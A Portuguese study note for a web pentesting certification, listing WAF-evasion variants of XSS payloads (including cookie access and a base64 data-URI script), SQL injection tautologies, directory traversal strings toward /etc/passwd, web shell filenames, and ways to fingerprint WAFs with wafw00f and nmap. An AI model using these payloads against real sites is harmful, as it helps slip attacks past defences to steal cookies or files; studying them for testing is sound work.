#INE #WebHacking #eWPTX
## Regras simples para Bypass em WAF
### Cross-site Scripting

| Usado normalmente | Melhor Opção |
| --- | --- |
| alert('xss') | prompt('xss') |
| alert(1) | prompt(8) |
|  | confirm('xss') |
|  | confirm(8) |
|  | alert(/xss/.source) |
|  | window\[/alert/.source](8) |

| Usado normalmente | Melhor Opção |
| --- | --- |
| alert(document.cookie) | with(document)alert(cookie) |
|  | alert(document\['cookie']) |
|  | alert(document\[/cookie/.source]) |
|  | alert(document\[/coo/.source+/kie/.source]) |

| Usado normalmente | Melhor Opção |
| --- | --- |
| \<img src=x onerror=alert(1);> | \<svg/onload=alert(1)> |
|  | \<video src=x onerror=alert(1);> |
|  | \<audio src=x onerror=alert(1);> |

| Usado normalmente | Melhor Opção |
| --- | --- |
| javascript:alert(document.cookie) | data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4= |
### Blind SQL Injection

| Usado normalmente | Melhor Opção |
| --- | --- |
| 'or 1=1 | 'or 6=6 |
|  | 'or 0x47=0x47 |
|  | or char(32)='' |
|  | or 6 is not null |
### SQL Injection

| Usado normalmente | Melhor Opção |
| --- | --- |
| UNION SELECT | UNION ALL SELECT |
### Directory Traversal

| Usado normalmente | Melhor Opção |
| --- | --- |
| /etc/passwd | /too/../etc/far/../passwd |
|  | /etc//passwd |
|  | /etc/ignore/../passwd |
|  | /etc/passwd............. |
### Web Shell

| Usado normalmente | Melhor Opção |
| --- | --- |
| c99.php | augh.php |
| r57.php |  |
| shell.aspx |  |
| cmd.jsp |  |
| CmdAsp.asp |  |
## WAF Detection and Fingerprinting
### Valor de Cookie

**Citrix Netscaler** -> Usa alguns cookies diferentes como ```ns_af``` ou ```citrix_ns_id``` ou ```NSC_```

**F5 BIG-IP ASM** -> Usa cookies começando com "TS" e continua com uma string que segue o seguinte regex:
	```
	^TS\[a-zA-Z0-9]{3,6}```

**Barracuda** -> Usa 2 cookies: ```barra_counter_session``` e ```BNI__BARRACUDA_LB_COOKIE```
### Header Rewrite

Alguns WAFs reescrevem os HTTP headers modificando o "Server" ou removendo dependendo da requisição
### HTTP Response Code

Alguns WAFs modificam o HTTP response code se a requisição for hostil

**mod_security** -> ```406 Not Acceptable```
**AQTRONIX WebKnight** -> ```999 No Hacking```
### HTTP Response Body

É possível detectar a presença de um WAF no response body
#### mod_security

![[Pasted image 20231219195354.png]]
#### AQTRONIX WebKnight

![[Pasted image 20231219195403.png]]
#### dotDefender

![[Pasted image 20231219195413.png]]
### Close Connection

Uma função interessante presente em alguns WAFs é a ```close connection```, que serve para dropar conexões em caso de requisições maliciosas
## Tools
### wafw00f

É uma tool escrita em python e que pode detectar 20 tipos diferentes de WAF

https://github.com/EnableSecurity/wafw00f

A ferramenta utiliza técnicas similares as abordadas acima:
1. Cookies
2. Server Cloaking
3. Response Codes
4. Drop Action
5. Pre-Built-In Rules

**Uso:**
```shell
wafw00f <site>
```
### nmap

O nmap possuí um script para detecção de WAFs o ```http-waf-fingerprint```

**Uso:**
```shell
nmap --script=http-waf-fingerprint <site> -p 80
```

